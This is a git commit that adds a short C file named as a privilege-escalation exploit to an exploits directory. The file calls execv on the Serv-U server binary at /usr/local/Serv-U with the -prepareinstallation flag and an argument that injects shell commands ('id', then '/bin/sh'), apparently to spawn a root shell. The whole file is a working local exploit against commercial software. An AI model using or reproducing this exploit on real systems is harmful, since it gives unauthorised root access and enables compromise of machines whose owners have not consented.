5bcb26bf9f9c970db7343d56ccb3253850eb3534
Raúl Sánchez <120066124+rsnchzl@users.noreply.github.com>
2023-11-04 23:49:30 +0100

    Create exploitprivilageescalation.c

---
+++ exploits/exploitprivilageescalation.c
@@ -0,0 +1,12 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main()
+{       
+    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
+    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
+    // if execv is successful, we won't reach here
+    printf("ret val: %d errno: %d\n", ret_val, errno);
+    return errno;
+}
